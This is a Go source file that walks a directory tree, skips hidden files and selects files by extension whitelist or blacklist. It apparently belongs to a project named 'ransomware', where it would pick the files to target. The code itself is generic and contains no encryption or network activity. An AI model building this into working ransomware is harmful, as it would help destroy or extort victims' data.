package fs

import (
	iofs "io/fs"
	"path/filepath"

	"github.com/marmos91/ransomware/utils"
)

// walkFiles walks the directory tree rooted at path, skipping hidden entries
// and filtering by extension, then calls visit for each matching file.
func walkFiles(path string, extBlacklist, extWhitelist []string, skipHidden bool, recursive bool, visit func(string, iofs.FileInfo) error) error {
	return filepath.Walk(path, func(currentPath string, info iofs.FileInfo, err error) error {
		if err != nil {
			return err
		}

		if skipHidden {
			hidden, err := IsHidden(currentPath)
			if err != nil {
				return err
			}
			if hidden {
				if info.IsDir() {
					return filepath.SkipDir
				}
				return nil
			}
		}

		if info.IsDir() {
			if !recursive && currentPath != path {
				return filepath.SkipDir
			}
			return nil
		}

		if !shouldProcess(currentPath, extWhitelist, extBlacklist) {
			return nil
		}

		return visit(currentPath, info)
	})
}

// WalkAndCollect returns all file paths under the given directory that pass
// the extension whitelist/blacklist filters and optional hidden-file check.
func WalkAndCollect(path string, extBlacklist, extWhitelist []string, skipHidden bool, recursive bool) ([]string, error) {
	var files []string

	err := walkFiles(path, extBlacklist, extWhitelist, skipHidden, recursive, func(filePath string, _ iofs.FileInfo) error {
		files = append(files, filePath)
		return nil
	})

	return files, err
}

func shouldProcess(path string, whitelist, blacklist []string) bool {
	ext := filepath.Ext(path)

	if len(whitelist) > 0 {
		return utils.SliceContains(whitelist, ext)
	}

	if len(blacklist) > 0 {
		return !utils.SliceContains(blacklist, ext)
	}

	return true
}
